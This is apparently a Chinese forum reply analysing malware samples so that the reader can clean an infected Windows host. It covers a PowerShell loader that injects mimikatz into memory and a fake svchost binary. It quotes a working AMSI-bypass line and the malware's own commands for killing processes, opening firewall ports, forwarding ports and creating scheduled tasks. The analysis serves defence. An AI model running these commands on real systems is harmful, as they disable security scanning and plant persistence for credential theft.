可以按照分析的清理就行，不是很难，已经全部分析完了，包括本地文件和云端的部分样本。病毒不是很难，这病毒最牛逼的地方在于，自动化扫描攻击。通过cmd开启65531
32 33端口，来标记该机器是否已经被感染。  
分析该样本需要先看一下powershell反混淆。地址是
### 1\. powershell作用。
关闭amis（防病毒接口）
`[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)`，具体可以参考
    Get-Win32Types函数的作用
        通过分析可知，该函数的作用时通过powershell，手工构造一个pe文件。例如
    ${TYpEBUiLdER} = ${MOdULEbUIldEr}.DefineEnum(('SubSystemType'), ('Public'), [UInt16])
            ${tyPeBuiLDEr}.DefineLiteral(('IMAGE_SUBSYSTEM_UNKNOWN'), [UInt16] 0) | Out-Null
            ${tYpEbUILdER}.DefineLiteral(('IMAGE_SUBSYSTEM_NATIVE'), [UInt16] 1) | Out-Null
            ${TypeBuILdER}.DefineLiteral(('IMAGE_SUBSYSTEM_WINDOWS_GUI'), [UInt16] 2) | Out-Null
            ${TYpeBuildER}.DefineLiteral(('IMAGE_SUBSYSTEM_WINDOWS_CUI'), [UInt16] 3) | Out-Null
            ${TYPebUiLDer}.DefineLiteral(('IMAGE_SUBSYSTEM_POSIX_CUI'), [UInt16] 7) | Out-Null
            ${TYPeBUiLDER}.DefineLiteral(('IMAGE_SUBSYSTEM_WINDOWS_CE_GUI'), [UInt16] 9) | Out-Null
            ${TyPebuILdEr}.DefineLiteral(('IMAGE_SUBSYSTEM_EFI_APPLICATION'), [UInt16] 10) | Out-Null
            ${TyPEbUIlDEr}.DefineLiteral(('IMAGE_SUBSYSTEM_EFI_BOOT_SERVICE_DRIVER'), [UInt16] 11) | Out-Null
            ${TypEBUiLdER}.DefineLiteral(('IMAGE_SUBSYSTEM_EFI_RUNTIME_DRIVER'), [UInt16] 12) | Out-Null
            ${tyPeBUiLDer}.DefineLiteral(('IMAGE_SUBSYSTEM_EFI_ROM'), [UInt16] 13) | Out-Null
            ${TyPebuIlDer}.DefineLiteral(('IMAGE_SUBSYSTEM_XBOX'), [UInt16] 14) | Out-Null
具体可以参考 
  * Get-Win32Constants 函数的作用，该函数的作用是设置刚才构造的PE文件的值。
  * Get-Win32Functions函数 该函数作用是加载系统DLL中的函数，方便powershell调用系统函数
  * Sub-SignedIntAsUnsigned函数 该函数是将有符号的int相减，并将结果转换为无符号的int
  * Add-SignedIntAsUnsigned函数 该函数是将有符号的int相加，并将结果转换为无符号整数
  * Compare-Val1GreaterThanVal2AsUInt函数 比较两个整数是否相等
  * Convert-UIntToInt函数 无符号整数转换有符号整数
  * Test-MemoryRangeValid函数 测试申请的内存区域是否可用
  * Write-BytesToMemory函数 将bytes写入内存中
  * Get-ProcAddress 相当于直接调用GetProcAddress 函数,检索指定的动态链接库(DLL)中的输出库函数地址
  * Enable-SeDebugPrivilege 启动给定进程的sedebug权限。该ps文件向内存释放mimikatz的pe可执行文件后，向这个被释放的线程开启sedebug权限，不然mimiakatz是无法运行的
  * Invoke-CreateRemoteThread 调用其他进程的线程
其他一些函数，大多数是获取PE文件头，倒入表 导出表的函数了
main函数很简单，从第2644行开始。前几行主要作用是要执行什么命令。pebYtes64这个变量中存储的是mimikatz经过base64编码后的内容。随后判断一下computername，去分别执行核心功能REMOtEsCRiPTBlOCK的代码。这个我没看出来有什么区别。
核心功能REMOtEsCRiPTBlOCK，的main函数在2468行。该函数的作用是向指定进程中注入mimikatz，然后在被注入的进程中执行mimikatz。推测小黑可能是在网上找到的使用脚本，参照
该powershell的危害：
  1. 通过mimikatz读取系统密码和系统可能保存的私钥，方便做横向移动
  2. 收集系统信息
除此之外，该powershell文件中释放的mimikatz没有落地，只在内存中运行，也没有留下后门等。
### 2\. svchost2.exe
拖到IDA，发现这个exe的作用只是启动一个名叫Ddriver，然后调用`signed int sub_40E8F0`这个函数
在这个函数中，首先调用`sub_40E3D0`，然后调用`sub_40D280`这个函数，写入一个`C:\\windows\\temp\\ttt.exe`这个文件  
然后回到`sub_40E3D0`，执行`cmd /c taskkill /f /im svhost.exe /im svhhost.exe /im
svvhost.exe & move /y c:\\windows\\temp\\svvhost.exe c:\\windo"
"ws\\temp\\svchost.exe & del c:\\windows\\system32\\svhhost.exe & del
c:\\windows\\syswow64\\svhhost.exe`
就是调用taskkill干掉svhost，然后删除。而windows中正确的名字是svchost，故意是干掉竞争对手吧。随后将`c:\\windows\\temp\\svvhost.exe`移动到
`c:\\windo" "ws\\temp\\svchost.exe`
，伪造svchost。这里推荐老哥想一下办法，修复就行。然后又通过wmic，删掉svhhost进程。
执行如下cmd `cmd /c wmic process where \"ExecutablePath like '%%drivers%%' and
name='taskmgr.exe'\" delete & wmic process where \"" "ExecutablePath like
'%%drivers%%' and name='svchost.exe'\" delete & wmic process where
\"ExecutablePath like '%%emp%" "%' and name='svchost.exe'\" delete`
删除windows任务管理器，干掉可执行路径在driver和temp中的svchost，估计是为了更好的隐藏病毒本体吧
执行如下cmd `cmd /c netsh interface ipv6 install&netsh firewall add portopening
tcp 65532 UDP&netsh interface portproxy add v4tov" "4 listenport=65532
connectaddress=1.1.1.1 connectport=53&netsh firewall add portopening tcp 65531
UDP2&netsh interfa" "ce portproxy add v4tov4 listenport=65531
connectaddress=1.1.1.1 connectport=53&netsh firewall add portopening tcp 65"
"533 ShareService`
解释一下 首先安装ipv6，然后设置防火墙打开udp 65532，然后设置v4tov4，也就是ipv4 代理 ，具体参见
随后就是设置一些乱七八糟的东西。推荐老哥重点看一下`C:\\windows\\system32中`是否有svhost这个文件，这个是病毒哈。
然后设置计划任务，代码贴出来，老哥根据这个删除就行 `cmd /c start /b sc start Schedule&ping localhost&sc
query Schedule|findstr RUNNING&&(schtasks /delete /TN %s /f&scht" "asks
/create /ru system /sc MINUTE /mo 50 /ST 07:00:00 /TN %s /tr \"cmd.exe /c
%s\"&schtasks /run /TN %s`
然后设置注册表，位置贴出来，老哥删除即可`Software\\Microsoft\\Windows\\CurrentVersion\\Run`，看一下在这个子目录中又没有可疑地key，应该是Driver。删除就行
回到 `sub_40E8F0`中，这里主要是启动任务啥的，看图，删除就行  
scvhost2的危害：
  1. 一大堆落地文件，修改注册表，计划任务，建议删除
### 3\. svchost1 分析
这个8MB的exe文件一看就不是好人。先扔到IDA中，发现有python字样。查看string，发现py2exe。这就说明该exe有很大几率是使用python写成的，打包为exe。我们可以使用unpy2exe这个工具还原python代码,参考